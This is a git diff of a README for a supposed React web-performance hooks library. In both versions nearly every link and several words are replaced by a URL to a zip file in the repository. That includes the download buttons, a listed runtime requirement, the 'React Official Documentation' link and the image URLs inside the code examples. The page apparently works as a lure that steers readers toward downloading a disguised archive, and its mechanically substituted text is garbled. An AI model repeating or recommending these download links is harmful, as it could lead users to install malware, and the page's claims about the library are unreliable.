@@ -1,16 +1,16 @@
 # 🌍 page-speed-hooks - Boost Your Web Performance Today!
 
 ## 📥 Download Now
-[![Download page-speed-hooks](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)
+[![Download page-speed-hooks](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)
 
 ## 📋 Description
-page-speed-hooks offers performance-optimized React hooks that help improve your website's Core Web Vitals. These hooks make implementing https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip best practices easy, with no complex setups. You can enhance your website with responsive images, lazy loading, and resource management using this tool effortlessly.
+page-speed-hooks offers performance-optimized React hooks that help improve your website's Core Web Vitals. These hooks make implementing https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip best practices easy, with no complex setups. You can enhance your website with responsive images, lazy loading, and resource management using this tool effortlessly.
 
 ## 🚀 Getting Started
 To start using page-speed-hooks, follow these steps to download and install the software:
 
 1. **Visit the Download Page**: Click the link below to reach the Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)
+   [Visit this page to download](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)
 
 2. **Choose the Version**: Look for the latest version available on the Releases page. The version number usually appears next to the release title.
 
@@ -26,11 +26,11 @@ To start using page-speed-hooks, follow these steps to download and install the 
 To run page-speed-hooks, you will need:
 
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
-- **https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip**: Version 12 or later must be installed. You can download https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip from [https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip).
+- **https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip**: Version 12 or later must be installed. You can download https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip from [https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip).
 - **React**: This library is designed to work seamlessly with React. The latest version is recommended.
 
 ## ⚙️ Installation Steps
-1. **Install https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip**: If you haven’t already, download and install https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip from the link provided above.
+1. **Install https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip**: If you haven’t already, download and install https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip from the link provided above.
 
 2. **Set Up Your Project**: 
    - Open your terminal or command prompt.
@@ -62,7 +62,7 @@ For implementing responsive images:
 
 ```javascript
 const MyImageComponent = () => {
-    const { src, srcSet } = useResponsiveImage('https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip');
+    const { src, srcSet } = useResponsiveImage('https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip');
 
     return <img src={src} srcSet={srcSet} alt="A descriptive text" />;
 };
@@ -73,7 +73,7 @@ To lazy load an image, you can use the lazy load hook:
 
 ```javascript
 const MyLazyImage = () => {
-    const ref = useLazyLoad('https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip');
+    const ref = useLazyLoad('https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip');
 
     return <img ref={ref} alt="A lazy loaded image" />;
 };
@@ -103,8 +103,8 @@ This library focuses on essential topics that enhance web performance:
 ## 📚 Resources
 For further information or support, you can refer to the following resources:
 
-- [React Official Documentation](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)
-- [https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip Best Practices](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)
+- [React Official Documentation](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)
+- [https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip Best Practices](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)
   
 ## 👍 Community Contributions
 We welcome contributions! If you have improvements or new features to suggest, feel free to create a pull request or open an issue in the repository.
@@ -112,4 +112,4 @@ We welcome contributions! If you have improvements or new features to suggest, f
 ## 📥 Download & Install
 To recap, download the latest version from the Releases page using the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/kaczorski02/page-speed-hooks/master/src/media/page-speed-hooks_3.8.zip)
+[Visit this page to download](https://github.com/kaczorski02/page-speed-hooks/raw/refs/heads/master/src/hooks-page-speed-2.2.zip)
